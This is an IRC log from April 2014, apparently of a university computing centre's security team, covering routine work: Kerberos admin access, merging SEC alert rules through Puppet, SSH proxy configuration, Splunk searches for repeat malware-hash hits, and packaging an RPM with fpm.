2014-04-15 16:49:25	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-04-15 16:49:25	--	Nicks #security: [eyrich hypnotoad jazoff keist soehlert wardog]
2014-04-15 16:49:25	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-04-15 16:49:27	--	Mode #security [+]
2014-04-15 16:49:27	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-04-15 16:50:26	<--	hypnotoad (soehlert@hidden-E95C13A8.ncsa.illinois.edu) has quit (Quit: leaving)
2014-04-15 16:58:01	keist	test
2014-04-15 18:29:49	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-04-15 18:29:49	--	Nicks #security: [eyrich jazoff keist soehlert wardog]
2014-04-15 18:29:49	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-04-15 18:29:51	--	Mode #security [+]
2014-04-15 18:29:51	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-04-15 18:50:12	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-04-15 18:50:12	--	Nicks #security: [eyrich jazoff keist soehlert wardog]
2014-04-15 18:50:12	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-04-15 18:50:14	--	Mode #security [+]
2014-04-15 18:50:14	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-04-15 19:20:15	--	irc: disconnected from server
2014-04-15 19:20:27	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-04-15 19:20:27	--	Nicks #security: [eyrich jazoff keist soehlert wardog]
2014-04-15 19:20:27	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-04-15 19:20:38	--	Mode #security [+]
2014-04-15 19:20:38	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-04-16 08:56:38	eyrich	wardog: need to order a few of these:
2014-04-16 08:56:39	eyrich	http://store.netgate.com/APU1C.aspx
2014-04-16 08:57:04	eyrich	so people can play with these since we are using so much in production
2014-04-16 09:49:31	keist	:)
2014-04-16 09:49:40	keist	yeah, wardog 
2014-04-16 11:22:56	soehlert	jazoff: +esc did the trick
2014-04-16 11:27:01	jazoff	cool
2014-04-16 12:11:26	wardog	eyrich: I'll see what I can do.
2014-04-16 12:11:39	wardog	Is there a 1u kit?
2014-04-16 12:14:40	wardog	so, i guess campus cluster finally redirected their syslog to syslog-sec....
2014-04-16 12:22:36	wardog	host what's dora[0-4]?
2014-04-16 12:37:25	soehlert	wardog: not sure what dora machines are
2014-04-16 12:38:07	soehlert	also, i haven't heard anything from SANS about the class I signed up for, any idea what to do?
2014-04-16 12:40:03	wardog	email securitysupport@illinois.edu and ask for an update
2014-04-16 12:40:21	soehlert	ich danke dir
2014-04-16 12:40:25	wardog	That'll create a ticket that they'll have to respond to
2014-04-16 12:54:41	soehlert	wardog: you want me to put the vetting tickets in jira right
2014-04-16 12:58:08	wardog	Yeah.
2014-04-16 12:59:04	soehlert	jazoff: one thing i'm not big on in weechat is that it doesn't open a new buffer when i msg you...did you get my msg?
2014-04-16 13:26:59	jazoff	soehlert: oh, I usually do /query foo
2014-04-16 13:27:09	jazoff	there might be an option to make msg -> open query
2014-04-16 13:37:59	soehlert	jazoff: brosshd keeps being "unresponsive" in puppet. any idea why?
2014-04-16 13:39:41	jazoff	no
2014-04-16 13:39:44	jazoff	routes maybe?
2014-04-16 13:39:50	jazoff	can it connect to squall on the port puppet uses?
2014-04-16 13:41:38	soehlert	ya when i run it manually it works fine
2014-04-16 13:41:52	jazoff	odd
2014-04-16 14:57:19	soehlert	random thought that i dont think has been mentioned directly before. can we set up hail/haboob to do auth like we do to the production esx service? getting rid of the local passwords on them would be nice
2014-04-17 07:16:46	eyrich	soehlert: only if someone ones to pay more $ to add hail/haboob to out vcenter system.
2014-04-17 09:37:55	wardog	Only paid ESX allows LDAP auth?
2014-04-17 09:47:56	wardog	soehlert: have you been able to change your teragrid admin pw from cerberos4?
2014-04-17 09:48:10	wardog	I get a GSS-API error trying to access kadmin
2014-04-17 09:49:22	soehlert	wardog: havent tried yet
2014-04-17 09:49:38	soehlert	i'll look into it
2014-04-17 09:50:04	wardog	 /nick hypnotoady
2014-04-17 09:50:14	--	You are now known as hypnotoad
2014-04-17 10:08:02	wardog	well, regular kerberos works.
2014-04-17 10:08:34	wardog	I mean kinit wraquel@TERAGRID.ORG
2014-04-17 10:08:46	hypnotoad	wait, that works you're saying?
2014-04-17 10:09:04	wardog	Yep
2014-04-17 10:09:22	wardog	My xsede kerb password work. Just can't get kadmin to work with wraquel/admin@TERAGRID.ORG
2014-04-17 10:09:35	wardog	I get that GSS-API error. I get a different error with a wrong password
2014-04-17 10:09:45	hypnotoad	one sec
2014-04-17 10:10:18	wardog	kadmin: GSS-API (or Kerberos) error while initializing kadmin interface
2014-04-17 10:11:04	wardog	kadmin -p wraquel/admin@NCSA.EDU works though.
2014-04-17 10:11:05	hypnotoad	shit, i left my post it at home
2014-04-17 10:11:12	hypnotoad	i cant test
2014-04-17 10:16:31	hypnotoad	wouldn't it make sense it only works with the p flag?
2014-04-17 10:16:52	hypnotoad	since the p flag specifies the principal to use
2014-04-17 10:28:44	wardog	yeah. I did that.
2014-04-17 10:28:58	hypnotoad	right i know you said it worked, so that seems to be on the up and up no?
2014-04-17 10:29:04	wardog	kdamin -p wraquel/admin@NCSA.EDU and TERAGRID.ORG. NCSA works, not TERAGRID
2014-04-17 10:29:20	hypnotoad	ooo i misread that
2014-04-17 10:30:48	wardog	hmmm. may need to add a realm flag. Let me try that
2014-04-17 10:31:42	wardog	that was it
2014-04-17 10:31:47	wardog	kadmin -p wraquel/admin@TERAGRID.ORG -r TERAGRID.ORG
2014-04-17 10:31:54	hypnotoad	ahhh ok that makes sense
2014-04-17 11:27:11	wardog	Anyone want to walk down to County Market to get taco supplies?
2014-04-17 11:27:42	hypnotoad	ya i was thinking the same
2014-04-17 11:28:17	wardog	I also made a metric tonne of a filipino dish called Pancit if anyone is interested.
2014-04-17 12:05:39	keist	wardog: I am interested
2014-04-17 12:07:10	wardog	It's on the table
2014-04-17 15:22:13	wardog	heh
2014-04-17 15:22:22	hypnotoad	?
2014-04-17 15:22:28	wardog	hypnotoad: I think we're both fighting over the SEC rule for root logins.
2014-04-17 15:22:46	hypnotoad	oh hah i already have it there i just dont know how to push it to puppet
2014-04-17 15:22:50	wardog	should be (taub|golub)h\d+
2014-04-17 15:23:02	wardog	It's automatic
2014-04-17 15:23:26	hypnotoad	nah not needed. i copied the rule i made for .10 that was working
2014-04-17 15:23:26	hypnotoad	they just moved the xcat server
2014-04-17 15:23:41	hypnotoad	so i copied my rule and added .11
2014-04-17 15:24:02	hypnotoad	oh nvm i see what youre saying
2014-04-17 15:24:04	wardog	Right. Only problem is that it won't cover golubh logs.
2014-04-17 15:24:14	wardog	Just taub
2014-04-17 15:24:26	hypnotoad	somehow my eyes skipped right to sshd
2014-04-17 15:24:26	hypnotoad	and i was thinking theres not even a mention of the host there..
2014-04-17 15:25:01	wardog	You updating or you want me to?
2014-04-17 15:25:06	hypnotoad	i did
2014-04-17 15:25:12	wardog	yay.
2014-04-17 15:25:21	wardog	2k emails in 1 day is excessive.
2014-04-17 15:25:22	hypnotoad	except i did it directly in puppet...whoops
2014-04-17 15:26:08	hypnotoad	there we go
2014-04-17 15:26:28	wardog	Looks like you were having comcast issues last night
2014-04-17 15:27:34	hypnotoad	?
2014-04-17 15:27:50	hypnotoad	irc related?
2014-04-17 15:44:49	wardog	Yeah, hopping on and off line
2014-04-17 15:45:01	wardog	hypnotoad: did jlong just download that crap, again?
2014-04-17 15:46:43	hypnotoad	ah no im moving to weechat and was playing with the relay thing so my phone was jumping in and out
2014-04-17 15:46:50	hypnotoad	and idk about again he just used it earlier
2014-04-17 15:46:57	hypnotoad	s/used/downloaded/
2014-04-17 20:15:59	wardog	jazoff: how are you supposed to run update_subtrees? as a specific user? From puppet? as root?
2014-04-18 08:24:37	jazoff	wardog: just ./update_subtrees from yoru machine
2014-04-18 08:24:51	jazoff	it just does a git pull
2014-04-18 08:33:59	wardog	from my laptop?
2014-04-18 08:34:09	wardog	oh, from analysis-sec?
2014-04-18 08:35:10	wardog	For some reason SEC changes in git were automatically being propogated to analysis-sec. Now, it's no longer the case.
2014-04-18 08:36:12	wardog	update substrees doesn't appear to exist on analysis-sec
2014-04-18 08:56:20	wardog	jazoff: Finish your last VSL please. https://internal.ncsa.illinois.edu/mis/vsl/index.php
2014-04-18 08:58:33	jazoff	sure, one sec
2014-04-18 09:09:45	wardog	jazoff: I made the change but it's still not getting over to analysis-sec. Was there something else I needed to do?
2014-04-18 09:09:54	wardog	I commited and pushed
2014-04-18 09:14:37	jazoff	it still needs to be merged into puppet
2014-04-18 09:14:39	jazoff	lemme try that now
2014-04-18 09:15:10	jazoff	ah, still a conflict, but only one line this time
2014-04-18 09:15:23	jazoff	oh, a few lines
2014-04-18 09:15:26	jazoff	but i think i see how to fix it
2014-04-18 09:15:27	wardog	sigh
2014-04-18 09:15:52	wardog	How do we fix it?
2014-04-18 09:16:19	jazoff	I fixed
2014-04-18 09:16:58	jazoff	just take a look at
2014-04-18 09:17:01	jazoff	https://git-sec.internal.ncsa.edu/ncsa-security/puppet/blob/development/modules/sec/files/sec-configs/rules/ssh-non-ncsa.sec
2014-04-18 09:17:07	jazoff	and ensure that it looks how you expect it to
2014-04-18 09:17:27	jazoff	problem was that both you and sam changed the taub stuff so it conflicted
2014-04-18 09:24:54	wardog	So, if I make a change now, it will propogate alright?
2014-04-18 09:25:53	jazoff	yeah, just do the update subtrees
2014-04-18 09:25:57	jazoff	and then git push
2014-04-18 09:26:03	jazoff	well it's...
2014-04-18 09:26:05	jazoff	make change in sec repo
2014-04-18 09:26:06	jazoff	git push
2014-04-18 09:26:11	jazoff	switch to puppet repo
2014-04-18 09:26:13	jazoff	update subtrees
2014-04-18 09:26:14	jazoff	git push
2014-04-18 09:27:30	wardog	ok, I think I understand.
2014-04-18 09:27:38	wardog	Make my changes in SEC configs
2014-04-18 09:27:44	wardog	commit/push
2014-04-18 09:28:04	wardog	pull puppet, run update_subtrees.sh, commit/push?
2014-04-18 09:28:12	jazoff	yeah
2014-04-18 09:28:27	jazoff	it's mostly setup that way with 2 repos so that someone can workon the sec repo that doesn't have access to the puppet repo
2014-04-18 09:28:42	wardog	And if there's a conflict?
2014-04-18 09:30:43	wardog	I just have to make sure to run update_subtrees in the right branch?
2014-04-18 09:31:17	wardog	wait, why is analysis-sec a dev server?
2014-04-18 09:35:24	hypnotoad	because we need to update the environment on some servers, but we also need to see what we can push to production
2014-04-18 09:42:28	wardog	fuck.. looks like the golubh/taubh is fixed, but the previous rule for 72.36.84.10 is broken. fixing.
2014-04-18 09:49:03	wardog	Is update_subtrees supposed to hang on sec-configs?
2014-04-18 09:49:47	wardog	Ah... ssh: connect to host git-sec.internal.ncsa.edu port 22: Operation timed out
2014-04-18 09:49:51	wardog	fatal: Could not read from remote repository.
2014-04-18 09:50:17	hypnotoad	do you have a connection to fog open? i think git-sec needs to be tunneled through fog
2014-04-18 09:50:32	wardog	I do. I have git set to redirect through my proxy, but not for ssh.
2014-04-18 09:50:44	wardog	It looks like it's trying to directly contact git-sec.
2014-04-18 09:50:51	hypnotoad	ya that wont work
2014-04-18 09:58:15	wardog	I also get permissions error for getting mal-dnssearch
2014-04-18 09:58:25	jazoff	yep, use something like this:
2014-04-18 09:58:26	jazoff	Host git-sec*
2014-04-18 09:58:26	jazoff	    Hostname git-sec.internal.ncsa.edu
2014-04-18 09:58:26	jazoff	    Proxycommand ssh fog -W %h:%p
2014-04-18 09:58:58	wardog	Can it use an already open proxy?
2014-04-18 10:00:28	hypnotoad	you have control master set up?
2014-04-18 10:03:40	wardog	?
2014-04-18 10:04:05	hypnotoad	thats how you would use a previous connection
2014-04-18 10:04:07	wardog	Ug. This keeps sshing and I have to wait until my RSA code changes
2014-04-18 10:04:22	hypnotoad	control master would mean once a day RSA too :)
2014-04-18 10:04:41	hypnotoad	http://www.anchor.com.au/blog/2010/02/ssh-controlmaster-the-good-the-bad-the-ugly/
2014-04-18 10:04:56	wardog	aaaand just pulled that up. :)
2014-04-18 10:06:20	wardog	TIL
2014-04-18 10:08:10	wardog	That was cool.
2014-04-18 10:09:05	wardog	thoughts on disabling this phalanx rule?
2014-04-18 10:09:33	hypnotoad	idk if we need to disable it, but ignoring the qualys ones would be a great move
2014-04-18 10:16:31	wardog	I think the root login rules are fixed now... http://open.spotify.com/track/1YwNlWLf8auhazSQUDQLFU
2014-04-18 10:16:39	hypnotoad	spotify?
2014-04-18 10:17:06	wardog	It's a link to Depeche Mode's 'Enjoy the Silence'
2014-04-18 10:17:14	hypnotoad	ahhh nice
2014-04-18 10:24:56	wardog	so, why is jbarlow/root@NCSA.EDU ksu on the CA systems?
2014-04-18 10:25:01	wardog	ksuing
2014-04-18 10:25:31	hypnotoad	where you seeing that?
2014-04-18 10:25:46	wardog	oh.. this is an old file...
2014-04-18 10:26:00	wardog	/usr/local/SEC/scriptscheck-ksu-discripency
2014-04-18 10:26:21	wardog	I thought I renamed that file.
2014-04-18 10:26:32	hypnotoad	oh
2014-04-18 10:28:03	keist	wardog: servers are in my car
2014-04-18 10:28:08	wardog	aight
2014-04-18 10:28:21	wardog	Probably should get them in the building this afternoon
2014-04-18 10:30:21	keist	I thought you were taking them home
2014-04-18 10:30:32	wardog	Nope. Need to run them from here.
2014-04-18 10:31:04	keist	ah
2014-04-18 10:56:23	wardog	How often does puppet push git changes?
2014-04-18 10:57:31	hypnotoad	puppet runs every 15 minutes
2014-04-18 10:57:31	hypnotoad	though you can run it immediately if you want
2014-04-18 10:58:18	hypnotoad	i just ran it for you on analysis-sec
2014-04-18 10:59:09	wardog	how do you run it manually?
2014-04-18 10:59:34	hypnotoad	either on the host run `puppet agent -t (--noop lets you see what it'd do without making changes)
2014-04-18 10:59:53	hypnotoad	yyou can also go to the dashboard->live management->
2014-04-18 11:00:05	hypnotoad	highlight the host(s) you want->run puppet
2014-04-18 11:00:49	wardog	k
2014-04-18 11:02:10	hypnotoad	jesus, jlong redownloaded the exact same thing as yesterday..
2014-04-18 11:58:49	wardog	I think that's 3 times.
2014-04-18 11:59:29	wardog	I wonder if it's something pulling it. Should look at the http_outbound record to see if there's a referral string. If not, it could be some toolbar pulling down an upgrade.
2014-04-18 13:39:48	hypnotoad	thats what im starting to think to 
2014-04-18 16:21:55	wardog	jazoff: how do I update the insecure tag for the vulnerable Flash versions in Splunk?
2014-04-18 16:28:26	wardog	found it
2014-04-18 16:42:27	wardog	what just happnened with the SEC rules for golub/taub?
2014-04-18 16:42:52	hypnotoad	idk it might be my fault. i had issues where you pushed yesterday after i saved but before i did
2014-04-18 16:43:04	hypnotoad	i tried to just pull in all your changes over mine, but im guessing i failed
2014-04-18 16:44:01	wardog	Just did a pull of the SEC rules in git. THey look fine. Whatever is on analysis-sec looks messed up.
2014-04-18 16:44:16	wardog	ph
2014-04-18 16:44:21	wardog	wait a second.
2014-04-18 16:44:36	hypnotoad	are your rules in git up to puppet?
2014-04-18 16:44:36	hypnotoad	did you update the subtree?
2014-04-18 16:44:47	wardog	I did earlier today
2014-04-18 16:44:52	wardog	Haven't touched it since then.
2014-04-18 16:45:15	wardog	Also, these email alerts from coming in from soehlert@analysis-sec.ncsa.illinois.edu
2014-04-18 16:47:55	hypnotoad	ya idk why
2014-04-18 16:48:30	hypnotoad	sec is supposed to send emails as the user who starts it and puppet has root restart it
2014-04-18 16:48:30	hypnotoad	even when i restarted by hand after su'ing to secops it still sent from soehlert
2014-04-18 16:48:30	hypnotoad	and i searched for my email and its not in any configs i could find
2014-04-18 16:50:36	wardog	And back to sam
2014-04-18 16:50:46	hypnotoad	yup i just ran puppet again...as root
2014-04-18 16:51:07	hypnotoad	im gonna su to jschipp and do it :)
2014-04-18 16:51:25	wardog	I want a turn!
2014-04-18 16:51:40	hypnotoad	run puppet agent -t on there as root and see if you get it
2014-04-18 16:53:23	wardog	rules on analysis-sec still look messed up
2014-04-18 16:53:31	wardog	They don't match what's in git
2014-04-18 16:54:02	hypnotoad	thats confusing
2014-04-18 18:12:16	jazoff	now, this is some nice filtering on the arista:
2014-04-18 18:12:18	jazoff	mbps: in=3362 out=81 filtered=3281
2014-04-18 18:12:18	jazoff	mbps: in=2251 out=67 filtered=2184
2014-04-18 18:12:18	jazoff	mbps: in=3310 out=62 filtered=3248
2014-04-18 18:12:18	jazoff	mbps: in=2276 out=82 filtered=2194
2014-04-18 18:12:19	jazoff	mbps: in=3327 out=94 filtered=3233
2014-04-18 18:12:22	jazoff	mbps: in=3328 out=95 filtered=3233
2014-04-18 18:12:24	jazoff	mbps: in=2314 out=80 filtered=2234
2014-04-18 18:12:27	jazoff	mbps: in=3391 out=79 filtered=3312
2014-04-21 07:13:23	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2014-04-21 07:18:24	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-04-21 08:39:03	wardog	So I'm guessing the issue with the SEC rules wasn't fixed.
2014-04-21 08:39:15	jazoff	oh?
2014-04-21 08:39:19	jazoff	I thought we got everything merged
2014-04-21 08:44:05	wardog	Huh.
2014-04-21 08:44:06	wardog	Weird.
2014-04-21 08:44:38	wardog	I did a diff between the puppet branch and the sec-config branch and only a few lines in a singlefile differ.
2014-04-21 08:49:01	jazoff	were those the lines that conflicted?
2014-04-21 08:49:04	jazoff	with that taub host?
2014-04-21 08:49:04	wardog	Not sure why, but updats_subtrees was not picking up the change.
2014-04-21 08:49:20	wardog	yes.
2014-04-21 08:49:24	wardog	taub/golub
2014-04-21 08:49:34	jazoff	ah, that probably explains it
2014-04-21 08:49:39	wardog	?
2014-04-21 08:49:55	jazoff	why they differ
2014-04-21 08:50:57	wardog	according to diff there were 9 lines in the sec-config version that weren't in the puppet branch.
2014-04-21 08:53:17	wardog	well it looks like it's fixed now. Just have to wait for puppet to run
2014-04-21 09:08:20	jazoff	eyrich: doh, just noticed I'm not adding the headers to the csv files
2014-04-21 09:09:07	jazoff	easy fix...
2014-04-21 09:10:03	jazoff	fixed
2014-04-21 09:25:59	eyrich	Weyland at CITES is working on a linux secrity doc for campus admins. can people take a look and provide him feed back
2014-04-21 09:26:01	eyrich	https://wiki.cites.illinois.edu/wiki/display/SECPUB/Linux+Security+Basics
2014-04-21 09:39:14	hypnotoad	weird. that gave me 404, but suggested another page. I went to that and it has the same URL as the one you pasted..
2014-04-21 09:44:30	wardog	hypnotoad: did your irc client multi-line the link?
2014-04-21 09:44:43	hypnotoad	nope
2014-04-21 09:44:43	hypnotoad	it took me to the same one
2014-04-21 09:47:06	wardog	HashKnownHosts.
2014-04-21 09:47:57	wardog	surprised there's no recommendation for local firewall, just campus level...
2014-04-21 09:48:10	wardog	Ah
2014-04-21 09:48:11	wardog	next section
2014-04-21 09:48:23	wardog	nano... really?
2014-04-21 09:48:34	hypnotoad	whatd eyrich write that??
2014-04-21 09:49:34	wardog	And he's using a Xerox IP address for his examples.
2014-04-21 09:50:06	wardog	screenshots... for a terminal window.....
2014-04-21 09:51:19	 *	jazoff commented
2014-04-21 09:51:33	jazoff	could be worse, it could be a photo of the monitor
2014-04-21 09:51:47	hypnotoad	could be a photo of a screen shot
2014-04-21 09:54:02	hypnotoad	hah i like how you do your netstat flags. plunt. i always do tulpn
2014-04-21 09:54:31	jazoff	:)
2014-04-21 09:54:46	jazoff	flags to netstat are one of those things that is heavy in the cargo-culting
2014-04-21 11:09:19	eyrich	jazoff: seems to be an issue with length of comment field when unblocking an ip
2014-04-21 11:09:49	jazoff	what sort of issue?
2014-04-21 11:11:11	eyrich	it does not unblock - goes to the page that would normally confirm the action performed - instead blank except for the title
2014-04-21 11:11:29	jazoff	ah, through the cgi you mean?
2014-04-21 11:11:33	jazoff	doe unblock work via the cli?
2014-04-21 11:11:57	eyrich	yes gui, not sure - didnot test i shortened by comment until it worked
2014-04-21 11:12:22	eyrich	RE splunk: what is the best query to see connection log for a remote host
2014-04-21 11:12:29	jazoff	host=nameofhost
2014-04-21 11:12:43	jazoff	oh wait
2014-04-21 11:12:50	jazoff	do you mean netflow, or the logs from the host itself?
2014-04-21 11:13:06	eyrich	host=139.229.19.220 no results.
2014-04-21 11:13:33	eyrich	that IP was bhrd for port scanning am ncsa host. need to see what connections it tried to make
2014-04-21 11:13:45	jazoff	ah
2014-04-21 11:13:50	jazoff	plop it into info..
2014-04-21 11:14:04	jazoff	portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/139.229.19.220
2014-04-21 11:14:12	eyrich	splunk cant do this?
2014-04-21 11:14:50	jazoff	it can, and ninfo will give you give you the link to splunk 
2014-04-21 11:14:58	eyrich	ok
2014-04-21 11:15:55	jazoff	how long was the BHR reason you were using?
2014-04-21 11:16:20	jazoff	the field is a VARCHAR(256), so if it was REALLY long that would fail
2014-04-21 11:20:21	jazoff	139.229.19.220 definitely likes talking to 141.142.225.147
2014-04-21 11:20:24	eyrich	i did not type that many chars when it was failing
2014-04-21 11:21:01	jazoff	is there  anything in the apache error log?
2014-04-21 11:21:09	eyrich	also: thanks for the portal sec link - found what we needed
2014-04-21 11:21:19	eyrich	havent looked - i will investiate
2014-04-21 11:22:16	jazoff	only other guess is unicode issues.. microsoft stuff loves inserting smart quotes everywhere which can break things
2014-04-21 11:53:23	jazoff	updated scan thresholds in dev
2014-04-21 11:53:35	jazoff	if nothing breaks  I will push to supercell when I get back from walk
2014-04-21 12:02:46	wardog	eyrich: do you have any scan stats for metrics for BW in Q1?
2014-04-21 12:03:43	eyrich	scan? are you talking qualys or bro bhr stuff?
2014-04-21 12:05:15	eyrich	im working on bw fw migration with pww right now - our change window is noon-2pm
2014-04-21 12:05:23	eyrich	probably wont make xsede call
2014-04-21 12:05:44	eyrich	we have not started yet - the change before us has not completed yet
2014-04-21 12:08:20	wardog	yeah, qualys
2014-04-21 12:08:25	wardog	np
2014-04-21 12:08:53	eyrich	i can look through the tickets.
2014-04-21 12:09:02	eyrich	its has been slow, not many new things
2014-04-21 12:09:56	wardog	Well, anything that's possible in the 'Scans' section on here https://wiki.ncsa.illinois.edu/pages/editpage.action?pageId=31556232
2014-04-21 12:13:48	wardog	How many automated bro blocks during Q1?
2014-04-21 12:14:31	eyrich	jazoff: ?
2014-04-21 12:24:12	jazoff	?
2014-04-21 12:24:23	jazoff	I was talking about bro stuff
2014-04-21 12:29:52	jazoff	running bhr report from splunk now
2014-04-21 12:33:49	jazoff		total	611643
2014-04-21 12:33:50	jazoff	2	unique	226326
2014-04-21 12:44:08	keist	anyone see this: https://packagecloud.io/ . They offer free package hosting for up to 25 packages, useful for personal stuff when you don't want to setup a server.
2014-04-21 12:46:51	jazoff	can just use s3 for that
2014-04-21 12:47:42	jazoff	you'd haev to build the repo locally, but then you can just sync the dir to s3
2014-04-21 12:48:45	jazoff	and at 3 cents/gig/month you can store a lot of packages cheaply on s3
2014-04-21 12:53:02	keist	but packagcloud always easy co-existence of different packages from different distributions 
2014-04-21 13:23:07	hypnotoad	so we have a phalanx alert we need to look into, but im not really sure how to do so. not sure what to look for. anyone have experience with that?
2014-04-21 13:28:32	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-04-21 13:28:35	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-04-21 13:30:36	eyrich	10.5 fw swapper - heading to lunch
2014-04-21 13:34:16	jazoff	hypnotoad: try now
2014-04-21 13:36:01	jazoff	er, not you
2014-04-21 13:37:15	jazoff	now, this is interesting, https://flynn.io/#preview-release
2014-04-21 13:37:24	jazoff	(flynn ~ open source heroku)
2014-04-21 13:40:49	hypnotoad	jazoff: fpm help?
2014-04-21 13:41:27	jazoff	sure
2014-04-21 13:41:59	hypnotoad	so im trying to build the auditin-sshd client
2014-04-21 13:42:14	hypnotoad	but i want the configure flags to be used in the rpm..not sure how to make that happen
2014-04-21 13:44:21	jazoff	hmm?
2014-04-21 13:44:40	hypnotoad	so i would normall do `fpm -s dir -t rpm -n "issdh" -v 6.2p2 openssh-6.2p2-hpn-v3.12`
2014-04-21 13:45:02	hypnotoad	but then i realized that if i was building straight from source i would use some flags in the configure step and my fpm command wont reflect that
2014-04-21 13:45:31	jazoff	but the configure comes before you run fpm
2014-04-21 13:46:01	hypnotoad	so i do the configure and make steps then run fpm
2014-04-21 13:46:38	jazoff	right...
2014-04-21 13:46:50	jazoff	like all the other ones we did...
2014-04-21 13:47:01	hypnotoad	i need to do it more often
2014-04-21 13:47:13	jazoff	I don't follow
2014-04-21 13:47:15	hypnotoad	i forget and my others are just from the tar.gz
2014-04-21 13:47:29	hypnotoad	nvm i just have never built one using the dir command so i didnt know when to do it.
2014-04-21 13:48:50	jazoff	ah
2014-04-21 13:48:54	jazoff	just copy one of the ones I did
2014-04-21 13:49:01	jazoff	like for libev or such
2014-04-21 13:49:22	hypnotoad	well all i see is the output rpm. are you suggesting you have it documented somewhere
2014-04-21 13:49:33	jazoff	in the packages repo
2014-04-21 13:50:14	hypnotoad	well right im in there and see the libev rpm, but htat doesnt say how you made it
2014-04-21 13:51:14	jazoff	ooooh noooooo
2014-04-21 13:51:31	jazoff	git@git-sec.internal.ncsa.edu:ncsa-security/packages.git
2014-04-21 13:53:02	hypnotoad	are you pointing me to the Makefile?
2014-04-21 13:53:42	hypnotoad	cuz if so then i think i understand now
2014-04-21 13:53:52	jazoff	yes, that repo is all makefiles :)
2014-04-21 13:54:12	hypnotoad	i seeeee sorry i didnt really know about it hence my confusion
2014-04-21 13:54:18	hypnotoad	git cloning now..
2014-04-21 13:54:33	jazoff	yeah I just realized 'packages repo' means different things :)
2014-04-21 14:08:44	hypnotoad	jazoff: whats the usr/local at the end of this command for?
2014-04-21 14:08:48	hypnotoad	 fpm -s dir -t rpm -n libev -v $(ver) -C /tmp/installdir \
2014-04-21 14:08:48	hypnotoad	-p libev-VERSION_ARCH.rpm \
2014-04-21 14:08:48	hypnotoad	usr/local
2014-04-21 14:08:54	hypnotoad	prefix?
2014-04-21 14:10:15	jazoff	directory to include in the package
2014-04-21 14:10:40	hypnotoad	sorry im slow today...to include in the package?
2014-04-21 14:11:03	jazoff	the rpm
2014-04-21 14:11:27	hypnotoad	right i get that part. not sure what part that directory plays. like include all the files in usr/local?
2014-04-21 14:12:10	jazoff	yes
2014-04-21 14:12:37	hypnotoad	ok
2014-04-21 14:46:37	hypnotoad	jazoff: wasn't this the suse machine running windows vm that downloaded some bad stuff recently? qiyuelu1-suse.ncsa.illinois.edu
2014-04-21 14:48:10	jazoff	hmm
2014-04-21 14:49:28	jazoff	yeah, march 24th
2014-04-21 14:49:38	jazoff	check your SENT mail from that date
2014-04-21 14:50:23	hypnotoad	any way we can have splunk show us repeat offenders for malwarehashregistry matches?
2014-04-21 14:50:30	jazoff	yes
2014-04-21 14:51:05	hypnotoad	i guess it's more curiousity than anything, but i feel like much of our business comes from repeaters
2014-04-21 14:54:50	hypnotoad	wtf...future me modified a file.
2014-04-21 14:54:50	hypnotoad	Warning: File `Makefile' has modification time 0.61 s in the future
2014-04-21 14:56:58	jazoff	ah, that can happen with vagrant shared dirs
2014-04-21 14:58:22	jazoff	index=*bro* source=*notice* (knownbad OR TeamCymruMalwareHashRegistry) | eval day=strftime(_time, "%Y-%m-%d") | stats dc(day) as days by src | search days > 1
2014-04-21 14:58:30	hypnotoad	so just move my makefile outside of a shared dirs
2014-04-21 14:59:14	jazoff	no.. just slow down :)
2014-04-21 14:59:41	hypnotoad	ughhh worst answer ever
2014-04-21 14:59:41	hypnotoad	thanks for the splunk search
2014-04-21 14:59:51	jazoff	but you probably do want to move the stuff out of the shared folders.. shared folder performance is bad
2014-04-21 14:59:53	eyrich	:)
2014-04-21 15:00:17	jazoff	heh well if you had ran the make .61 seconds later it would have been ok :)
2014-04-21 15:15:14	hypnotoad	well that wasnt fun but got the isshd.rpm built and in the repo
2014-04-21 15:23:52	jazoff	ah...
2014-04-21 15:24:03	jazoff	need to mark the config files as config files
2014-04-21 15:24:07	jazoff	otherwise bad things will happen
2014-04-21 15:24:12	hypnotoad	huh?
2014-04-21 15:24:20	jazoff	-rw-r--r--    1 root    root                     1555 Apr 21 15:10 /usr/local/nerscmod/etc/ssh_config
2014-04-21 15:24:23	jazoff	-rw-r--r--    1 root    root                     3643 Apr 21 15:10 /usr/local/nerscmod/etc/sshd_config
2014-04-21 15:24:37	hypnotoad	how do you "mark" them?
2014-04-21 15:24:43	jazoff	see the nfsen makefile
2014-04-21 15:25:08	jazoff	also going to need to add the --iteration option when you rebuild it to make a new version of the rpm
2014-04-21 15:25:27	hypnotoad	--iteration meaning my personal iteration?
2014-04-21 15:25:43	jazoff	yeah
2014-04-21 15:25:55	hypnotoad	and just update that each time i make changes to the Makefile?
2014-04-21 15:26:09	jazoff	yeah, vs. an update to ssh itself
2014-04-21 15:26:14	hypnotoad	gotcha
2014-04-21 15:26:24	jazoff	otherwise you can't get a box to upgrade it since the version did not change
2014-04-21 15:26:30	hypnotoad	makes sense
2014-04-21 15:26:55	jazoff	I had that problem with nfsen.. worked fine and then I upgraded it and it replaced the config with the stock config :)
2014-04-21 15:27:19	hypnotoad	so looking at bwbh1 i see: -rw-r--r-- 1 root root   1555 Mar 30  2012 ssh_config
2014-04-21 15:27:19	hypnotoad	-rw-r--r-- 1 root root   3960 Feb  4 16:13 sshd_config
2014-04-21 15:27:54	hypnotoad	do i still need to do the config files thing?
